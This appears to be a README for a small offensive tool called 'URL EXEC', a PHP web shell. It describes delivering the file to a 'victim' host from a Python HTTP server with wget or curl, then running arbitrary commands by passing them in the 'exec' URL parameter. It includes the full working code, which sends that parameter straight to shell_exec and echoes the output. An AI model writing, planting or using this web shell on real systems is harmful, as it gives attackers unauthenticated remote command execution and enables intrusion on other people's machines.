# URL EXEC
This script works as it follows:
1. You introduce the script called ```1.php``` onto the system via a http python server and the commands wget and curl, for example:

>> python3 -m http.server 8888

2. From a web browser, or via command line (using the command mentioned above curl) you can execute the script using the url:

>> http://<victim_ip_address>/1.php?exec=<command_to_run>

3. The command run will be shown in the screen.

The code we have done for this script is the following:

```php
<?php
    $command=$_GET['exec'];

    $output = shell_exec($command);
    echo "<pre>$output</pre>";
?>
```
